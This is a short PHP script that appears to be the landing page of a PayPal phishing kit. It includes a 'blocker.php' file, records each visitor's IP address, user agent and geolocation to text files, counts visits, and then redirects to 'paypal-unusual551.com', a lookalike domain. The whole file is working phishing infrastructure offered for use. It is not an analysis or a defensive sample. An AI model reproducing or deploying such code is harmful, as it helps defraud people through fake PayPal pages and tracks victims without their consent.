<?php
error_reporting(0);

include 'blocker.php';
include 'kontol.php';

$dt = date("l, F j Y");
$dt2 = date("h:i:s A");
$ip				= $_SERVER['REMOTE_ADDR'];
$user_agent		= $_SERVER['HTTP_USER_AGENT'];
$details		= json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip.""));
$nama_negara	= $details->geoplugin_countryName;
$kota			= $details->geoplugin_city;
$state			= $details->geoplugin_regionName;

$msg = "IP		: ".$ip."
User-Agent	: ".$user_agent."
Country		: ".$nama_negara."
City		: " . $kota . "
State		: " . $state . "
Time		: ".$dt2."
Date		: ".$dt."
Check		: http://www.geoplugin.net/json.gp?ip=".$ip."
";

$kntl = "IP : ".$ip."
";

$file=fopen("visitor-ip.txt","a");
fwrite($file, $kntl);
fclose($file);

$file=fopen("visitor-info.txt","a");
fwrite($file, $msg);
fclose($file);

$filecounter=("visitor-total.txt");
$kunjungan=file($filecounter);
$kunjungan[0]++;
$file=fopen($filecounter,"w");
fputs($file,"$kunjungan[0]");
fclose($file);

?>
<?php header("Location: https://paypal-unusual551.com/?nid"); ?>